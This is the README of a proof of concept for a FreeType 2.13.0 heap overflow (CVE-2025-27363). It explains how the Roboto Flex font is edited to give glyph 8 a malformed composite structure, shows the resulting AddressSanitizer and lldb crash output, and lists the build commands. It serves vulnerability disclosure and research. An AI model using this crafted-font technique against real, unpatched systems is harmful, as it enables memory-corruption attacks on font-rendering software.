Proof-of-concept for [CVE-2025-27363](https://seclists.org/oss-sec/2025/q1/218) that crashes FreeType 2.13.0.

This modifies [Roboto Flex](https://github.com/googlefonts/roboto-flex), a variable font, so that the "%" character (glyph 8) is now a composite glyph with 0xfffd subglyphs.

Rendering the edited font with FreeType 2.13.0 (the last version before the [fix](https://github.com/freetype/freetype/commit/ef636696524b081f1b8819eb0c6a0b932d35757d)) crashes, with ASAN detecting a heap buffer overflow in [load_truetype_glyph](https://github.com/freetype/freetype/blob/de8b92dd7ec634e9e2b25ef534c54a3537555c11/src/truetype/ttgload.c#L1929):

```
$ lldb ../repos2/freetype-demos/build2/ftmulti -- ./rf2.ttf
(lldb) target create "../repos2/freetype-demos/build2/ftmulti"
Current executable set to '/Users/zhuowei/Documents/winprogress/freetype/repos2/freetype-demos/build2/ftmulti' (arm64).
(lldb) settings set -- target.run-args  "./rf2.ttf"
(lldb) run
Process 15657 launched: '/Users/zhuowei/Documents/winprogress/freetype/repos2/freetype-demos/build2/ftmulti' (arm64)
ftmulti(15657,0x1fb350840) malloc: nano zone abandoned due to inability to reserve vm space.
cannot open X11 display
FreeType Glyph Viewer - press ? for help
=================================================================
==15657==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000980 at pc 0x000100ec9cf0 bp 0x00016fdfc630 sp 0x00016fdfbde0
WRITE of size 16 at 0x602000000980 thread T0
    #0 0x100ec9cec in __asan_memcpy+0x440 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x51cec)
    #1 0x100117dbc in load_truetype_glyph ttgload.c:1929
    #2 0x100111678 in TT_Load_Glyph ttgload.c:2933
    #3 0x1000c8440 in tt_glyph_load ttdriver.c:484
    #4 0x1000774d4 in FT_Load_Glyph ftobjs.c:1065
    #5 0x10000b6d4 in LoadChar ftmulti.c:382
    #6 0x10000a0b8 in Render_All ftmulti.c:410
    #7 0x10000780c in main ftmulti.c:1168
    #8 0x191660270  (<unknown module>)

0x602000000980 is located 0 bytes after 16-byte region [0x602000000970,0x602000000980)
allocated by thread T0 here:
    #0 0x100eccc04 in malloc+0x94 (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x54c04)
    #1 0x1003f0230 in ft_alloc ftsystem.c:113
    #2 0x100098fbc in ft_mem_qrealloc ftutil.c:145
    #3 0x10007dfa0 in ft_mem_realloc ftutil.c:101
    #4 0x100117848 in load_truetype_glyph ttgload.c:1909
    #5 0x100111678 in TT_Load_Glyph ttgload.c:2933
    #6 0x1000c8440 in tt_glyph_load ttdriver.c:484
    #7 0x1000774d4 in FT_Load_Glyph ftobjs.c:1065
    #8 0x10000b6d4 in LoadChar ftmulti.c:382
    #9 0x10000a0b8 in Render_All ftmulti.c:410
    #10 0x10000780c in main ftmulti.c:1168
    #11 0x191660270  (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (libclang_rt.asan_osx_dynamic.dylib:arm64e+0x51cec) in __asan_memcpy+0x440
Shadow bytes around the buggy address:
  0x602000000700: fa fa 00 fa fa fa 00 fa fa fa 04 fa fa fa 00 04
  0x602000000780: fa fa 00 06 fa fa 00 fa fa fa fa fa fa fa 00 00
  0x602000000800: fa fa 04 fa fa fa 04 fa fa fa fa fa fa fa 04 fa
  0x602000000880: fa fa 04 fa fa fa 00 fa fa fa fa fa fa fa 00 fa
  0x602000000900: fa fa 00 00 fa fa 02 fa fa fa 01 fa fa fa 00 00
=>0x602000000980:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000b00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000b80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x602000000c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==15657==ABORTING
(lldb) AddressSanitizer report breakpoint hit. Use 'thread info -s' to get extended information about the report.
Process 15657 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = Heap buffer overflow
    frame #0: 0x0000000100ed71a8 libclang_rt.asan_osx_dynamic.dylib`__asan::AsanDie()
libclang_rt.asan_osx_dynamic.dylib`__asan::AsanDie:
->  0x100ed71a8 <+0>:  pacibsp 
    0x100ed71ac <+4>:  stp    x20, x19, [sp, #-0x20]!
    0x100ed71b0 <+8>:  stp    x29, x30, [sp, #0x10]
    0x100ed71b4 <+12>: add    x29, sp, #0x10
Target 0: (ftmulti) stopped.
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = Heap buffer overflow
  * frame #0: 0x0000000100ed71a8 libclang_rt.asan_osx_dynamic.dylib`__asan::AsanDie()
    frame #1: 0x0000000100ef27a0 libclang_rt.asan_osx_dynamic.dylib`__sanitizer::Die() + 192
    frame #2: 0x0000000100ed509c libclang_rt.asan_osx_dynamic.dylib`__asan::ScopedInErrorReport::~ScopedInErrorReport() + 1032
    frame #3: 0x0000000100ed43d8 libclang_rt.asan_osx_dynamic.dylib`__asan::ReportGenericError(unsigned long, unsigned long, unsigned long, unsigned long, bool, unsigned long, unsigned int, bool) + 1456
    frame #4: 0x0000000100ec9d10 libclang_rt.asan_osx_dynamic.dylib`__asan_memcpy + 1124
    frame #5: 0x0000000100117dc0 ftmulti`load_truetype_glyph(loader=0x000000016fdfd8a0, glyph_index=8, recurse_count=0, header_only='\0') at ttgload.c:1929:31
    frame #6: 0x000000010011167c ftmulti`TT_Load_Glyph(size=0x0000616000000680, glyph=0x00006120000004c0, glyph_index=8, load_flags=0) at ttgload.c:2933:13
    frame #7: 0x00000001000c8444 ftmulti`tt_glyph_load(ttslot=0x00006120000004c0, ttsize=0x0000616000000680, glyph_index=8, load_flags=0) at ttdriver.c:484:13
    frame #8: 0x00000001000774d8 ftmulti`FT_Load_Glyph(face=0x000061b000000780, glyph_index=8, load_flags=0) at ftobjs.c:1065:15
    frame #9: 0x000000010000b6d8 ftmulti`LoadChar(idx=8, hint=1) at ftmulti.c:382:12
    frame #10: 0x000000010000a0bc ftmulti`Render_All(first_glyph=0, pt_size=64) at ftmulti.c:410:23
    frame #11: 0x0000000100007810 ftmulti`main(argc=1, argv=0x000000016fdff5c0) at ftmulti.c:1168:11
    frame #12: 0x0000000191660274 dyld`start + 2840
(lldb) up 5
frame #5: 0x0000000100117dc0 ftmulti`load_truetype_glyph(loader=0x000000016fdfd8a0, glyph_index=8, recurse_count=0, header_only='\0') at ttgload.c:1929:31
   1926	        }
   1927	
   1928	        points[i++] = loader->pp1;
-> 1929	        points[i++] = loader->pp2;
   1930	        points[i++] = loader->pp3;
   1931	        points[i  ] = loader->pp4;
   1932	
(lldb) print limit
(short) -3
(lldb) print i
(short) 2
(lldb) print points
(FT_Vector *) 0x0000602000000970
(lldb) print loader->pp2
(FT_Vector)  (x = 1848, y = 0)
```

Building:

```
brew install wget fonttools p7zip
./download_roboto_flex.sh
./buildfont.sh
```
